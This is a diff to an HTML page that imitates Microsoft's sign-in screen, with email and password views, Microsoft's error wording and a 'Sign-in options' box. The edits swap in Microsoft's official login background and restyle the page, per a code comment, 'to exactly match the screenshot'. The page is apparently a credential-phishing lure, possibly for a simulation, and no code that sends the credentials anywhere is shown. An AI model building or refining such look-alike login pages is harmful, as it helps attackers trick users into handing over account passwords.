@@ -6,41 +6,49 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="shortcut icon" href="/images/favicon.ico">
+  <!-- Using a minimal set of Bootstrap for basic utilities, but custom styles will override for layout -->
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
   <style>
+    /* --- CSS TO EXACTLY MATCH THE SCREENSHOT --- */
     body, html {
-      background-color: #f2f2f2;
       height: 100%;
+      margin: 0;
+      font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
+      /* Official Microsoft login page background */
+      background-image: url('https://login.microsoftonline.com/templates/src/images/epic-backgrounds/0-1920x1080.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-position: center center;
     }
     .main-container {
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100%;
-      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
-      background-size: cover !important;
-      background-repeat: no-repeat !important;
-      background-attachment: fixed !important;
-      background-position: center center !important;
+      width: 100%;
+    }
+    .form-wrapper {
+      max-width: 440px; /* This is the key to matching the size */
+      width: 100%;
     }
     .form-box {
-      background-color: #ffffff;
-      padding: 24px;
-      max-width: 440px;
-      width: 100%;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 44px;
     }
     .form-box h1 {
       font-size: 24px;
       font-weight: 600;
       margin-bottom: 24px;
+      color: #1b1b1b;
     }
     .form-control {
       border: 0;
-      border-bottom: 1px solid #6c757d;
+      border-bottom: 1px solid #8A8886;
       border-radius: 0;
       padding-left: 0;
+      font-size: 16px;
     }
     .form-control:focus {
       box-shadow: none;
@@ -49,14 +57,14 @@
     .form-box p {
       font-size: 15px;
       margin-top: 16px;
+      margin-bottom: 0;
     }
     .form-box a {
       color: #0067b8;
     }
-    .options-box {
-      margin-top: 16px;
-      border-top: 1px solid #d2d2d2;
-      padding-top: 16px;
+    .form-box .btn {
+      font-size: 15px;
+      padding: 6px 20px;
     }
     #back {
       cursor: pointer;
@@ -64,18 +72,37 @@
       font-size: 16px;
       vertical-align: middle;
     }
+    .options-box {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 24px 44px;
+      margin-top: 16px;
+      border-top: 1px solid #d2d2d2;
+    }
+    .options-box p {
+        margin: 0;
+    }
+    .options-box a {
+      color: #1b1b1b;
+      text-decoration: none;
+    }
+    .options-box a:hover {
+      text-decoration: underline;
+    }
+    .fa-key {
+        color: #5e5e5e;
+    }
   </style>
 </head>
 <body>
 
   <div class="main-container">
-    <div>
+    <div class="form-wrapper">
       <!-- Main Sign-in Box -->
       <div class="form-box">
         <!-- Email View -->
         <div id="div1">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo"><br><br>
-          <h1>Sign in</h1>
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <h1 class="mt-4">Sign in</h1>
           <span id="error" class="text-danger" style="display:none; font-size: 13px;">That Microsoft account doesn't exist. Enter a different account.</span>
           <div class="form-group mt-2">
             <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
@@ -89,8 +116,10 @@
 
         <!-- Password View -->
         <div id="div2" style="display:none;">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo"><br><br>
-          <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span><br>
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <div class="mt-4">
+              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
+          </div>
           <h1 class="mt-3">Enter password</h1>
           <span id="msg" class="text-danger" style="display:none; font-size: 13px;">Please enter your password.</span>
           <div class="form-group mt-2">
@@ -104,9 +133,9 @@
       </div>
 
       <!-- "Sign-in options" Box -->
-      <div class="form-box mt-3" id="options_box">
+      <div class="form-box" id="options_box">
         <div class="options-box">
-          <p style="margin-top: 0;"><i class="fas fa-key" style="color: #555;"></i> <a href="#">Sign-in options</a></p>
+          <p><i class="fas fa-key"></i> <a href="#">Sign-in options</a></p>
         </div>
       </div>
     </div>
